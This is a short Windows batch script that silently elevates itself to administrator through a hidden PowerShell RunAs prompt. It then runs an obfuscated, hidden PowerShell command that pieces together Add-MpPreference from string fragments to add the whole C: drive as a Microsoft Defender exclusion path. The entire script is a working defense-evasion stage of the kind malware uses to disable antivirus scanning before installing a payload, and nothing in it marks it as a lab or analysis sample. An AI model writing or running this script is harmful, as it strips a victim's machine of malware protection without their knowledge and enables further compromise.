@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)
powershell -WindowStyle Hidden -Command "$s1='$c=\"Add-MpPreference\";'; $s2='$n=\"ExclusionPath\";'; $s3='$v=\"C:\\\";'; $s4='$h=@{};$h[$n]=$v;& $c @h'; $code=$s1+$s2+$s3+$s4; IEX $code"